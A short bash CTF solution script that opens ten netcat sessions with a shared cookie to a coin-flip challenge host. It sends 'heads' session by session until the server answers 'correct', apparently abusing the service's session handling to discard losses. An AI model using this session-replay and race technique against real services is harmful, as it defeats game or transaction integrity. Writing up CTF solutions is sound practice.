#!/bin/bash
# by craig
# superugly in bash, for the lulz

# connect x sessions to the service
# send header, including cookie
# session 1: flip coin
# if successful, disconnect all other sessions
# if unsuccessful, flip coin in another session

# (feed with cookie that had success on the first try ./script.sh “sid=...”)

pipe()
{

mynumber=$1
cookie=$2

cat <<EOF
POST /flip HTTP/1.1
Host: coinflip.ctf.zone
Content-Length: 5
Content-Type: application/x-www-form-urlencoded
Cookie: $cookie

EOF
while [ 1 ]
do
    sleep 1
    if [ -e /tmp/coin/$mynumber ]
    then
        echo "heads"
    fi
done
}

#curl -s --data heads http://coinflip.ctf.zone/flip -D - | grep ^set | awk '{print $2}'

cookie="$1"

while [ 1 ]
do
    # start sessions
    echo -n "Starting pipes"
    for ((i=0;i<10;i++))
    do
        pipe $i "$cookie" | nc coinflip.ctf.zone 80 > /tmp/coin/$i.output &
        echo -n "."
    done

    echo
    sleep 1

    # look at sessions
    for ((i=0;i<10;i++))
    do
        echo "Looking at session $i"
        touch /tmp/coin/$i
        sleep 2
        if [ "$(grep '{"correct":true' /tmp/coin/$i.output)" ];
        then
            echo "$i -> found"
            cat /tmp/coin/$i.output
            pkill -9 nc &>/dev/null
            break
        else
            echo "$i -> not found"
        fi 
        
    done
    pkill -9 nc &>/dev/null
    rm /tmp/coin/*

done
